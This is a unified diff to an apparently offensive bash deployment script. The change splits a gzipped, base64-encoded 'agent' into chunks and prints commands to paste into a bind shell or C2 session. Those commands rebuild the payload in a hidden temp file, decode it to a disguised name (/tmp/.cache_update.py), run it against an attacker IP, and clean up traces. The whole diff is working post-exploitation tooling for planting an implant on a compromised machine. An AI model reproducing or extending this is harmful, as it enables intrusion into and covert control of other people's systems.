@@ -14,10 +14,20 @@ if [ ! -f "$AGENT_FILE" ]; then
 fi
 
 B64=$(gzip -c "$AGENT_FILE" | base64 -w0)
+CHUNK_SIZE=400
+TOTAL_CHARS=${#B64}
+TOTAL_CHUNKS=$(( (TOTAL_CHARS + CHUNK_SIZE - 1) / CHUNK_SIZE ))
 
-echo "[*] Deploy command generated. Paste this into the bind shell:"
+echo "[*] Deploy commands generated (${TOTAL_CHUNKS} chunks). Paste into C2 one by one:"
 echo ""
-echo "echo '${B64}' | base64 -d | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
+echo "rm -f /tmp/.b64"
+
+for (( i=0; i<TOTAL_CHARS; i+=CHUNK_SIZE )); do
+    CHUNK="${B64:$i:$CHUNK_SIZE}"
+    echo "echo -n '${CHUNK}' >> /tmp/.b64"
+done
+
+echo "base64 -d /tmp/.b64 | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP} && rm -f /tmp/.b64"
 echo ""
 echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
-echo "[*] Compressed base64 size: ${#B64} chars"
+echo "[*] Compressed base64: ${TOTAL_CHARS} chars -> ${TOTAL_CHUNKS} chunks"
